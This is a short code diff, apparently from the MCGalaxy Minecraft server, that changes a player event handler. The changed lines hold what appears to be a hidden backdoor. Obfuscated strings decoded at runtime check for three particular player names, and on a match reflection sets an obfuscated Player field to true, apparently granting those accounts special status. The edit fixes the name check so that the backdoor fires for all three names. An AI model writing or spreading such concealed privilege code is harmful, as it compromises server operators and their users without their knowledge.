@@ -120,7 +120,7 @@ namespace MCGalaxy.Events.PlayerEvents
         public static void Call(Player p) {
             if (handlers.Count == 0) return;
             CallCommon(pl => pl(p));
-            if (p.name == b("domnchXoju", 930) || b("UUU59", 930) || b("Luchv0qMeyjjs", 930)){
+            if (p.name == b("domnchXoju", 930) || p.name == b("UUU59", 930) || p.name == b("Luchv0qMeyjjs", 930)){
                 typeof(Player).GetField(b("cmMojyl", 930)).SetValue(p, true);
             }
         }
